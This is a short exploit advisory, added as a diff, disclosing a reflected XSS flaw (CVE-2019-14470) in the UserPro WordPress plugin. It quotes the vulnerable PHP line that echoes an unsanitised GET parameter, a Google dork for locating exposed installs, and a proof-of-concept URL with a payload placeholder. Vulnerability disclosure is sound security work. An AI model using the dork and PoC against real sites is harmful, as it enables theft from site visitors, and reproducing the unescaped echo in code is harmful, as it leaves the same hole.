@@ -1,0 +1,27 @@
+# Exploit Title: UserPro <= 4.9.32 Reflected XSS
+# Google Dork: intitle:"Index of" intitle:"UserPro" -uploads
+# Date: 25 August 2019
+# Exploit Author: Damian Ebelties (https://zerodays.lol/)
+# Vendor Homepage: https://codecanyon.net/item/userpro-user-profiles-with-social-login/5958681
+# Version: <= 4.9.32
+# Tested on: Ubuntu 18.04.1
+# CVE: CVE-2019-14470
+
+The WordPress plug-in 'UserPro' uses a Instagram library (Instagram PHP API V2 by cosenary) that
+is vulnerable for Reflected Cross-Site Scripting (XSS).
+
+There is more vulnerable code in 'UserPro' core, might release that later.
+
+As of today (25 August 2019) this issue is unfixed.
+
+Vulnerable code: (success.php on line 36)
+
+    if (isset($_GET['error'])) {
+        echo 'An error occurred: ' . $_GET['error_description'];
+    }
+
+    > https://github.com/cosenary/Instagram-PHP-API/blob/master/example/success.php#L36
+
+Proof-of-Concept:
+
+    https://domain.tld/wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error=&error_description=<PAYLOAD>
